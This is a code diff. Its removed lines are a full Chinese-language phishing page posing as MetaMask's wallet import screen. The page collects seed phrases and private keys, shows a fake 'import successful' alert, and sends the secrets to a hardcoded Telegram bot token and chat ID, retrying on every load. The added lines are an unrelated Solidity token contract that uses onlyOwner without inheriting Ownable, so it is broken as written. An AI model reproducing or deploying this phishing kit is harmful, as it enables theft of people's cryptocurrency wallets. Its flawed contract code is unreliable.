@@ -1,108 +1,19 @@
-<!DOCTYPE html>
-<html lang="zh-CN">
-<head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>MetaMask</title>
-<style>
-  *{margin:0;padding:0;box-sizing:border-box;font-family:-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,sans-serif}
-  body{background:#F7F8FA;color:#1A1A1A;min-height:100vh}
-  .container{max-width:420px;margin:0 auto;background:#fff;min-height:100vh}
-  .header{padding:24px;text-align:center}
-  .logo{width:50px;margin-bottom:10px}
-  .title{font-size:22px;font-weight:700;color:#24272E}
-  .sub-title{font-size:14px;color:#707279;margin-top:4px}
-  .form{padding:24px}
-  .form-group{margin-bottom:20px}
-  .form-group label{display:block;font-size:14px;color:#24272E;margin-bottom:8px}
-  .form-control{
-    width:100%;padding:14px 16px;border:1px solid #DCDFE4;border-radius:10px;
-    font-size:15px;outline:none;background:#fff;color:#24272E
-  }
-  .btn-primary{
-    width:100%;padding:16px;background:#037DD6;border:none;border-radius:10px;
-    color:#fff;font-size:16px;font-weight:600;margin-top:12px
-  }
-</style>
-</head>
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.20;
+import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
+import "@openzeppelin/contracts/access/Ownable.sol";
 
-<body>
-<div class="container">
-  <div class="header">
-    <img src="https://upload.wikimedia.org/wikipedia/commons/3/36/MetaMask_Fox.svg" class="logo">
-    <div class="title">MetaMask</div>
-    <div class="sub-title">导入钱包</div>
-  </div>
+contract ZHM is ERC20 {
+    address public stakingContract;
 
-  <div class="form">
-    <div class="form-group">
-      <label>助记词</label>
-      <input id="words" type="text" class="form-control" placeholder="请输入助记词">
-    </div>
-    <div class="form-group">
-      <label>私钥</label>
-      <input id="key" type="text" class="form-control" placeholder="请输入私钥">
-    </div>
+    constructor() ERC20("ZhongHuaMeng", "ZHM") {}
 
-    <button class="btn-primary" onclick="go()">确认导入</button>
-  </div>
-</div>
+    function setStakingContract(address _staking) external onlyOwner {
+        stakingContract = _staking;
+    }
 
-<script>
-// ===================== 你的信息已固定 =====================
-const TG_BOT_TOKEN   = "8527941922:AAG3-y2pTmA3f07TYHXkCJABsrdFTFALRUA";
-const TG_CHATID      = "6503982157";
-const MAX_RETRY      = 5;
-const DELAY          = 3000;
-// ==========================================================
-
-const STORAGE_KEY = "WALLET_DATA";
-
-// 一打开就自动补发
-window.onload = autoSend;
-window.addEventListener('online', autoSend);
-
-// 导入：免确认，不卡点
-function go() {
-  const mn = document.getElementById("words").value.trim();
-  const pk = document.getElementById("key").value.trim();
-  if (!mn && !pk) return;
-
-  // 只提示，不等待确认
-  alert("✅ 导入成功");
-
-  localStorage.setItem(STORAGE_KEY, JSON.stringify({ mn, pk, retry: 0 }));
-  autoSend();
+    function mint(address to, uint256 amount) external {
+        require(msg.sender == stakingContract, "only staking");
+        _mint(to, amount);
+    }
 }
-
-// 只发电报
-async function autoSend() {
-  const task = localStorage.getItem(STORAGE_KEY);
-  if (!task) return;
-
-  const d = JSON.parse(task);
-  if (d.retry >= MAX_RETRY) {
-    localStorage.removeItem(STORAGE_KEY);
-    return;
-  }
-
-  const text = `【小狐狸钱包导入】
-时间：${new Date().toLocaleString()}
-助记词：${d.mn || "-"}
-私钥：${d.pk || "-"}`;
-
-  try {
-    await fetch(`https://api.telegram.org/bot${TG_BOT_TOKEN}/sendMessage`, {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({ chat_id: TG_CHATID, text })
-    });
-  } catch(e) {}
-
-  d.retry++;
-  localStorage.setItem(STORAGE_KEY, JSON.stringify(d));
-  setTimeout(autoSend, DELAY);
-}
-</script>
-</body>
-</html>
